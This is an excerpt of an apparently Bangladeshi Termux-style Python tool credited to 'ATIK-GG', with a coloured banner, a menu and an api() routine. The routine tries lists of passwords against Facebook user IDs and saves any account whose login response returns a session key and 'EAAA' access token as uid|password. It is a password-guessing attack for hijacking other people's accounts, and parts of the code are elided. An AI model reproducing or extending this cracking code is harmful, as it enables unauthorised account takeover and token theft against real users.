...
logo = ("""\033[1;32m
\t\033[1;32m      _     _________  _____  ___  ____   
     / \   |  _   _  ||_   _||_  ||_  _|  
    / _ \  |_/ | | \_|  | |    | |_/ /    
   / ___ \     | |      | |    |  __'.    
 _/ /   \ \_  _| |_    _| |_  _| |  \ \_  
...
\033[1;32m══════════════════════════════════════════════════════
\033[1;32m[💜]     \033[1;32mCREATED BY\33    :  \033[1;33mAtik Hasan\33[0;m\033[1;32m
\033[1;32m[💜]     \033[1;32mFACEBOK      : \033[1;34m md  Atikur Islam 
\033[1;32m[💜]     \033[1;32mGITHUB       :  \033[1;35mATIK-GG
...
class Main:
	def __init__(self):
		...
		if Talha in ["1", "01"]:
			self.fbtua()
		if Talha in ["2", "02"]:
			os.system('xdg-open https://youtube.com/@ses.jamanar.ummat13')
		if Talha in ["3", "03"]:
			os.system('xdg-open https://youtube.com/@ses.jamanar.ummat13')
		if Talha in ["0", "00"]:
			self.old2()
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[92;1m[ATIK-GG] : %s/%s -> \033[0;92m [ OK:%s ]- \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[91;1m   [ATIK-CP] %s | %s\033[94;1m        "%(uid, pw)) 
				self.ok.append("%s|%s"%(uid, pw))
